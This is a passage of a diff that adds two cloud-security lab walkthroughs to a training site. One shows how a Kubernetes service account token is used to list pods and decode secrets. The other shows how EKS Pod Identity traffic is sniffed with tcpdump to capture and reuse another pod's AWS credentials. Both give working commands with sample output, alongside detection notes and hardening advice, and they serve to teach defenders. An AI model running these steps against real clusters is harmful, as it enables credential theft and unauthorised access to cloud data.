+      <li>Shell access to a running Kubernetes pod (any namespace)</li>
+      <li>The pod must have <code>automountServiceAccountToken: true</code> (the default unless explicitly disabled)</li>
+      <li><code>curl</code> or <code>kubectl</code> available inside the pod; <code>jq</code> for parsing (install if absent)</li>
+    </ul>
+  </div>
+
+  <div class="lab-steps">
+
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Read the projected service account token from the well-known mount path. This JWT token is automatically mounted unless <code>automountServiceAccountToken: false</code> is set.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@webapp-pod:/# cat /var/run/secrets/kubernetes.io/serviceaccount/token</div>
+            <div class="terminal-output">eyJhbGciOiJSUzI1NiIsImtpZCI6InRfbWJ3N2ZYa3BIMG1laFFKeGhmOGxWaXdNS2tPUmNkZERMVERCR3
+NMdFEifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjIl0sImV4cCI6MTc0MzU4
+MDAwMCwia...</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Read the CA certificate and namespace. These three pieces — token, CA cert, and namespace — are everything needed to authenticate to the Kubernetes API.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@webapp-pod:/# cat /var/run/secrets/kubernetes.io/serviceaccount/namespace</div>
+            <div class="terminal-output">default</div>
+            <div class="terminal-cmd">root@webapp-pod:/# cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt | head -3</div>
+            <div class="terminal-output">-----BEGIN CERTIFICATE-----
+MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwprdWJl
+cm5ldGVzMB4XDTI0MDMxNTA5MjIxMVoXDTM0MDMxMzA5MjIxMVowFTETMBEGA1UE</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Use the service account token to query the Kubernetes API directly via <code>curl</code>. List pods in the default namespace to see what else is running.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@webapp-pod:/# APISERVER=https://kubernetes.default.svc
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
+    -H "Authorization: Bearer $TOKEN" \
+    $APISERVER/api/v1/namespaces/default/pods | \
+    jq '.items[] | {name:.metadata.name, sa:.spec.serviceAccountName, status:.status.phase}'</div>
+            <div class="terminal-output">{
+    "name": "webapp-pod-7f8a9b",
+    "sa": "webapp-sa",
+    "status": "Running"
+}
+{
+    "name": "api-pod-3c4d5e",
+    "sa": "api-sa",
+    "status": "Running"
+}
+{
+    "name": "admin-tools-1a2b3c",
+    "sa": "admin-sa",
+    "status": "Running"
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Check the permissions of the current service account token via the SelfSubjectRulesReview API. Understand what Kubernetes actions you can perform.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@webapp-pod:/# kubectl auth can-i --list --token=$TOKEN 2>/dev/null || \
+    curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
+    -H "Authorization: Bearer $TOKEN" \
+    $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
+    -X POST -H "Content-Type: application/json" \
+    -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}' | \
+    jq '.status.resourceRules[] | select(.verbs | index("*") or index("get"))'</div>
+            <div class="terminal-output">Resources                          Non-Resource URLs   Resource Names   Verbs
+pods                               []                  []               [get list watch]
+secrets                            []                  []               [get list]      ← CAN READ SECRETS
+configmaps                         []                  []               [get list]</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Enumerate secrets to find credentials, API keys, and database passwords stored in Kubernetes. Base64-decode the secret data to recover plaintext values.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@webapp-pod:/# curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
+    -H "Authorization: Bearer $TOKEN" \
+    $APISERVER/api/v1/namespaces/default/secrets | \
+    jq '.items[] | {name:.metadata.name, type:.type}'</div>
+            <div class="terminal-output">{
+    "name": "database-credentials",
+    "type": "Opaque"
+}
+{
+    "name": "api-keys",
+    "type": "Opaque"
+}</div>
+            <div class="terminal-cmd">root@webapp-pod:/# curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
+    -H "Authorization: Bearer $TOKEN" \
+    $APISERVER/api/v1/namespaces/default/secrets/database-credentials | \
+    jq '.data | to_entries[] | {key, value: (.value | @base64d)}'</div>
+            <div class="terminal-output">{
+    "key": "username",
+    "value": "prod_admin"
+}
+{
+    "key": "password",
+    "value": "Pr0d-DB-S3cret!2026"
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Compromised Pod</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">SA Token</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">K8s API</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node highlight">Secrets / Creds</div>
+    </div>
+  </div>
+
+  <div class="lab-section">
+    <div class="lab-meta"><strong><i class="fa-solid fa-shield-halved"></i> Detection Notes</strong></div>
+    <ul>
+      <li>Alert on high-volume <code>list secrets</code> calls from a service account that normally only reads its own namespace resources</li>
+      <li>Kubernetes audit log: watch for <code>get/list</code> on <code>secrets</code> resource from unusual user-agents (curl vs. kubectl)</li>
+      <li>Use Kubernetes audit policy to log all access to <code>secrets</code> at the <code>Request</code> level</li>
+    </ul>
+  </div>
+
+  <div class="lab-section">
+    <div class="lab-meta"><strong><i class="fa-brands fa-adversal"></i> MITRE ATT&amp;CK Mapping</strong></div>
+    <ul>
+      <li><strong>T1613</strong> — Container and Resource Discovery (kubectl auth can-i, list pods)</li>
+      <li><strong>T1528</strong> — Steal Application Access Token (service account JWT)</li>
+      <li><strong>T1552.007</strong> — Unsecured Credentials: Container API (Kubernetes Secrets)</li>
+    </ul>
+  </div>
+
+  <div class="cleanup">
+    <strong><i class="fa-solid fa-broom"></i> Cleanup</strong>
+    <ul>
+      <li>Rotate any Kubernetes Secrets that were read during the lab</li>
+      <li>Review and tighten the RBAC permissions for the service account used</li>
+      <li>Set <code>automountServiceAccountToken: false</code> on pods that do not need API access</li>
+    </ul>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-circle-info"></i> Set <code>automountServiceAccountToken: false</code> on all pods that do not need Kubernetes API access. Use RBAC to restrict service account permissions to the minimum required. Consider using Kubernetes External Secrets Operator to store secrets outside the cluster entirely.
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<div class="lab-walkthrough-content" id="M14-L05-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> From a pod with <code>hostNetwork: true</code>, use packet sniffing to intercept other pods' AWS credentials being exchanged via the EKS Pod Identity HTTP endpoint.
+  </div>
+
+  <div class="prereq">
+    <strong><i class="fa-solid fa-list-check"></i> Prerequisites</strong>
+    <ul>
+      <li>Access to a pod configured with <code>hostNetwork: true</code></li>
+      <li>EKS cluster using Pod Identity (not IRSA) — Pod Identity uses <code>169.254.170.23</code></li>
+      <li>tcpdump installable or pre-installed in the container image</li>
+      <li>Note: AWS has patched newer EKS Pod Identity agent versions to encrypt credential delivery — this technique applies to unpatched versions</li>
+    </ul>
+  </div>
+
+  <div class="lab-steps">
+
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Verify the pod is running with <code>hostNetwork: true</code> by checking for host-level network interfaces (eth0, eni-xxx) instead of the typical veth pair.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@nettools-pod:/# ip addr</div>
+            <div class="terminal-output">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536
+    inet 127.0.0.1/8 scope host lo
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 9001
+    inet 10.0.3.42/24 scope global dynamic eth0
+3: eni8f2a1b3c4d: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 9001
+
+# Host interfaces visible (eth0, eni-xxx) → hostNetwork=true confirmed</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Install tcpdump if not already available.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@nettools-pod:/# apt-get update -qq && apt-get install -y -qq tcpdump</div>
+            <div class="terminal-output">Setting up tcpdump (4.99.4-3) ...
+Processing triggers for libc-bin ...</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Capture traffic to the EKS Pod Identity endpoint at <code>169.254.170.23</code>. Pre-patch, this traffic was unencrypted HTTP — all AWS credentials flowing to other pods on this node are visible.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@nettools-pod:/# tcpdump -i any -A 'port 80 and host 169.254.170.23' -w /tmp/capture.pcap &
+[1] 4567</div>
+            <div class="terminal-output">tcpdump: listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes</div>
+            <div class="terminal-cmd">root@nettools-pod:/# # Let it capture for a few minutes while other pods request credentials
+sleep 120 && kill %1</div>
+            <div class="terminal-output">47 packets captured</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Extract AWS credentials from the captured traffic. The Pod Identity HTTP responses contain full STS temporary credentials in plaintext JSON.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@nettools-pod:/# strings /tmp/capture.pcap | grep -A5 "AccessKeyId"</div>
+            <div class="terminal-output">{
+    "AccessKeyId": "ASIAIOSFODNN7OTHERPOD",
+    "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/OtherPodSecretKey",
+    "Token": "FwoGZXIvYXdzEBYaDH7v8G...(truncated)",
+    "AccountId": "123456789012",
+    "Expiration": "2026-04-02T20:00:00Z"
+}</div>
+            <div class="terminal-cmd">root@nettools-pod:/# strings /tmp/capture.pcap | grep -c "AccessKeyId"</div>
+            <div class="terminal-output">3</div>
+            <div class="terminal-cmd">root@nettools-pod:/# # Captured credentials from 3 different pods on this node</div>
+            <div class="terminal-output"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Use the captured credentials to impersonate the other pod's IAM role and access cloud resources it has permissions for.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@nettools-pod:/# export AWS_ACCESS_KEY_ID="ASIAIOSFODNN7OTHERPOD"
+export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/OtherPodSecretKey"
+export AWS_SESSION_TOKEN="FwoGZXIvYXdzEBYaDH7v8G..."
+aws sts get-caller-identity</div>
+            <div class="terminal-output">{
+    "UserId": "AROA3XFRBF23PODIDENT:eks-production-c-webapp-pod-7f8a9b-a1b2c3d4",
+    "Account": "123456789012",
+    "Arn": "arn:aws:sts::123456789012:assumed-role/eks-s3-full-access-role/eks-production-c-webapp-pod-7f8a9b-a1b2c3d4"
+}</div>
+            <div class="terminal-cmd">root@nettools-pod:/# # We're now operating as the webapp pod's S3 role
+aws s3 ls</div>
+            <div class="terminal-output">2024-01-10 08:22:11 prod-customer-data-bucket
+2024-02-15 14:33:22 prod-financial-reports
+2024-03-01 09:11:44 prod-application-logs</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">hostNetwork Pod</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">tcpdump</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Capture Pod Identity HTTP</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node highlight">Other Pods' AWS Creds</div>
+    </div>
+  </div>
+
+  <div class="lab-section">
+    <div class="lab-meta"><strong><i class="fa-solid fa-shield-halved"></i> Detection Notes</strong></div>
+    <ul>
+      <li>Alert on pods with <code>hostNetwork: true</code> outside of <code>kube-system</code> namespace (Falco, OPA Gatekeeper)</li>
+      <li>Alert on <code>tcpdump</code> or raw socket opens (<code>AF_PACKET</code>) from container processes (Falco rule: <code>launch_package_management_processes</code>)</li>
+      <li>Unusual <code>GetCredentials</code> or <code>AssumeRoleWithWebIdentity</code> call volume from a single node warrants investigation</li>
+    </ul>
+  </div>
+
+  <div class="lab-section">
+    <div class="lab-meta"><strong><i class="fa-brands fa-adversal"></i> MITRE ATT&amp;CK Mapping</strong></div>
+    <ul>
+      <li><strong>T1040</strong> — Network Sniffing (tcpdump on host network)</li>
+      <li><strong>T1552.005</strong> — Unsecured Credentials: Cloud Instance Metadata API (Pod Identity endpoint)</li>
+      <li><strong>T1613</strong> — Container and Resource Discovery</li>
+    </ul>
+  </div>
+
+  <div class="cleanup">
+    <strong><i class="fa-solid fa-broom"></i> Cleanup</strong>
+    <ul>
+      <li>Remove capture file: <code>rm /tmp/capture.pcap</code></li>
+      <li>Rotate any IAM credentials captured and used during the lab</li>
+      <li>Delete the hostNetwork lab pod: <code>kubectl delete pod nettools-pod</code></li>
+    </ul>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-triangle-exclamation"></i> Pre-patch EKS Pod Identity used unencrypted HTTP to <code>169.254.170.23</code> — any pod with <code>hostNetwork: true</code> could sniff all credentials on the node. AWS has since patched this. Restrict <code>hostNetwork</code> access via Pod Security Standards and audit all pods with this setting.
+  </div>
+</div>
